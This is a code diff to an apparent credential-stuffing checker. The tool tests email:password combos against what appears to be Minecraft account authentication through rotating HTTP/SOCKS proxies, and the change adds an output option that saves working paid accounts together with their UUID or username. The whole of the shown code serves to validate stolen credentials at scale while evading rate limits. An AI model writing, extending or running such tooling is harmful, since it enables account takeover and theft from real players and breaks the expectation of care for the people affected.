@@ -61,6 +61,7 @@ if not any([http_proxy_path, socks4_proxy_path, socks5_proxy_path]):
 
 try_amount = int(input("How many times an account should be tested before marking it as invalid (min. 1 (Only go above 4 if you have a shittone of working proxies)? Default: 4 \n") or "5")
 
+output_format =  int(input("What format should the output file be? Default is 1 \n1: email:password \n2: email:password:uuid \n3: email:password:username\n") or "1")
 
 print("Starting to check proxies")
 
@@ -117,8 +118,15 @@ def check(x):
                                    proxies=proxy_dict,
                                    timeout=6).text
             answer_json = json.loads(answer)
-            if bool(answer_json["availableProfiles"][0]["paid"]):
-                working_accounts.append(combo)
+            if bool(answer_json["selectedProfile"]["paid"]):
+                ign = answer_json["selectedProfile"]["name"]
+                uuid = answer_json["selectedProfile"]["id"]
+                if output_format == 1:
+                    working_accounts.append(combo)
+                if output_format == 2:
+                    working_accounts.append(combo + ":" + uuid)
+                if output_format == 3:
+                    working_accounts.append(combo + ":" + ign)
                 stats.working += 1
                 return
         except Exception:
